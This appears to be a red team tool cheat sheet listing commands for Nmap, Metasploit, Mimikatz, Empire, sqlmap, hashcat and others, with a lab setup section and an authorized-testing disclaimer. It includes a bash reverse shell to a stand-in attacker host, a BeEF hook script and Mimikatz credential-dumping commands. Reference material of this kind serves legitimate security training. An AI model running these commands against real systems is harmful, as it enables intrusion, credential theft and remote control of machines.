# Red Team Tools Documentation

Comprehensive guides for reconnaissance, scanning, exploitation, and post-exploitation tools used in red team assessments.

## Tool Categories

### 1. Reconnaissance & OSINT

#### Nmap
**Purpose:** Network discovery and port scanning  
**Installation:** `apt-get install nmap`

**Common Commands:**
```bash
# Basic scan
nmap target.com

# Aggressive scan
nmap -A -v target.com

# UDP scan
nmap -sU target.com

# SYN stealth scan
nmap -sS target.com

# Version detection
nmap -sV target.com

# OS detection
nmap -O target.com
```

#### Shodan
**Purpose:** Search engine for internet-connected devices  
**Website:** https://www.shodan.io/

**Usage:**
```
shodan search apache 2.4.41
shodan host <IP>
```

#### Whois
**Purpose:** Domain and IP information  
**Installation:** `apt-get install whois`

```bash
whois domain.com
whois ip-address
```

#### DNSRecon
**Purpose:** DNS enumeration  
**Installation:** `apt-get install dnsrecon`

```bash
dnsrecon -d domain.com
dnsrecon -d domain.com -a  # All enum
```

#### TheHarvester
**Purpose:** Email and subdomain harvesting  
**Installation:** `apt-get install theharvester`

```bash
theharvester -d domain.com -l 100 -b google
theharvester -d domain.com -b linkedin -l 50
```

---

### 2. Scanning & Enumeration

#### Nessus
**Purpose:** Vulnerability scanning  
**Installation:** Download from Tenable

**Workflow:**
1. Create new scan
2. Add target(s)
3. Select template
4. Configure settings
5. Launch and review results

#### OpenVAS
**Purpose:** Open-source vulnerability scanner  
**Installation:** `apt-get install openvas`

```bash
openvas-start
# Access via https://localhost:9392
```

#### Nikto
**Purpose:** Web server vulnerability scanner  
**Installation:** `apt-get install nikto`

```bash
nikto -h target.com
nikto -h target.com -port 8080
```

#### Masscan
**Purpose:** Fast port scanner  
**Installation:** `apt-get install masscan`

```bash
masscan 0.0.0.0/0 -p 80,443,22 --rate=1000
```

#### Aquatone
**Purpose:** Domain discovery and screenshot utility  
**Installation:** `apt-get install aquatone`

```bash
cat domains.txt | aquatone -out ./results
```

---

### 3. Exploitation Frameworks

#### Metasploit Framework
**Purpose:** Exploit development and delivery  
**Installation:** Included in Kali Linux

**Basic Usage:**
```bash
msfconsole
> use exploit/windows/smb/ms17-010
> set RHOST target.com
> set LHOST attacker.com
> set LPORT 4444
> exploit
```

#### Burp Suite
**Purpose:** Web application testing  
**Installation:** Download from PortSwigger

**Key Features:**
- Proxy intercepting
- Scanner
- Intruder (fuzzing)
- Repeater
- Decoder
- Collaborator

#### SQLmap
**Purpose:** SQL injection automation  
**Installation:** `apt-get install sqlmap`

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

#### BeEF
**Purpose:** Browser exploitation framework  
**Installation:** `apt-get install beef-xss`

```bash
beef
# Access via http://localhost:3000
# Hook: <script src="http://attacker:3000/hook.js"></script>
```

---

### 4. Post-Exploitation Tools

#### Mimikatz
**Purpose:** Windows credential dumping  
**Installation:** Download from GitHub

**Common Commands:**
```
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
vault::cred
```

#### Empire
**Purpose:** PowerShell post-exploitation framework  
**Installation:** `git clone https://github.com/EmpireProject/Empire.git`

**Usage:**
```bash
./empire
> agents
> uselistener http
> set Host attacker.com
> execute
```

#### Responder
**Purpose:** LLMNR/NBT-NS poisoning  
**Installation:** `apt-get install responder`

```bash
responder -I eth0 -v
responder -I eth0 -w -d
```

#### CrackMapExec
**Purpose:** Active Directory enumeration and exploitation  
**Installation:** `pip install crackmapexec`

```bash
crackmapexec smb 192.168.1.0/24
crackmapexec smb target.com -u username -p password --shares
crackmapexec smb target.com -u username -p password -x "whoami"
```

#### Impacket Suite
**Purpose:** Network protocol implementation  
**Installation:** `pip install impacket`

**Key Tools:**
- `psexec.py` - Remote execution via SMB
- `secretsdump.py` - Credential extraction
- `getTGT.py` - Kerberos ticket acquisition
- `wmiexec.py` - WMI-based remote execution

---

### 5. Command & Control Infrastructure

#### Cobalt Strike
**Purpose:** Adversary simulation and red teaming  
**Cost:** Commercial

**Capabilities:**
- Beacon payload
- C2 channels
- Post-exploitation
- Evasion techniques

#### Mythic
**Purpose:** Open-source C2 framework  
**Installation:** Docker-based deployment

#### Empire
**Purpose:** PowerShell-based C2  
**Installation:** GitHub repository

#### Sliver
**Purpose:** Go-based C2 framework  
**Installation:** Download from releases

---

### 6. Obfuscation & Evasion

#### Veil-Framework
**Purpose:** Payload obfuscation  
**Installation:** GitHub repository

#### UPX
**Purpose:** Executable packer  
**Installation:** `apt-get install upx`

```bash
upx -o packed.exe original.exe
```

#### Shikata Ga Nai
**Purpose:** Metasploit encoder  
**Usage:** Automatically applied during exploitation

#### PEiD
**Purpose:** Packer detection  
**Installation:** Download from website

---

### 7. Privilege Escalation

#### LinPEAS
**Purpose:** Linux privilege escalation enumeration  
**Installation:** Download from GitHub

```bash
./linpeas.sh
```

#### WinPEAS
**Purpose:** Windows privilege escalation enumeration  
**Installation:** Download from GitHub

```cmd
winpeas.bat
```

#### GTFOBins
**Purpose:** Privilege escalation via binaries  
**Website:** https://gtfobins.github.io/

#### Sudo Exploits
**Tool:** CVE-2021-3156 (Baron Samedit)
**Installation:** Download PoC from GitHub

---

### 8. Utilities

#### Hashcat
**Purpose:** Password cracking  
**Installation:** `apt-get install hashcat`

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
hashcat -m 1000 -a 3 -i hashes.txt ?a?a?a?a
```

#### John the Ripper
**Purpose:** Password cracking  
**Installation:** `apt-get install john`

```bash
john --wordlist=wordlist.txt hashes.txt
john --show hashes.txt
```

#### Wireshark
**Purpose:** Network protocol analyzer  
**Installation:** `apt-get install wireshark`

```bash
wireshark
tshark -i eth0 -w capture.pcap
```

#### Netcat
**Purpose:** Network utility and reverse shell  
**Installation:** Included in most Linux distributions

```bash
# Listener
nc -lvnp 4444

# Connection
nc target.com 4444

# Reverse shell
Bash: bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## Tool Installation Script

```bash
#!/bin/bash
# Install common red team tools on Kali Linux

sudo apt-get update
sudo apt-get install -y \
  nmap \
  nikto \
  masscan \
  sqlmap \
  dnsrecon \
  whois \
  theharvester \
  metasploit-framework \
  responder \
  wireshark \
  hashcat \
  john \
  hydra \
  aircrack-ng \
  gobuster \
  dirb

pip install:
  - impacket
  - crackmapexec
  - shodan
```

---

## Tool Comparison Matrix

| Task | Tool 1 | Tool 2 | Tool 3 |
|------|--------|--------|--------|
| Port Scanning | Nmap | Masscan | Zmap |
| Web Scanning | Burp Suite | OWASP ZAP | Nikto |
| Vulnerability Scan | Nessus | OpenVAS | Qualys |
| Exploitation | Metasploit | Cobalt Strike | Sliver |
| Credential Dump | Mimikatz | SecretsDump | Pypykatz |
| AD Enumeration | CrackMapExec | BloodHound | Impacket |
| C2 | Cobalt Strike | Empire | Mythic |

---

## Lab Setup

**Recommended Systems:**
- **Attacker:** Kali Linux or Parrot Security OS
- **Target:** Metasploitable, DVWA, HackTheBox, TryHackMe
- **Network:** Isolated lab environment (VirtualBox, VMware)

---

**Last Updated:** 2026  
**Disclaimer:** For authorized security testing only
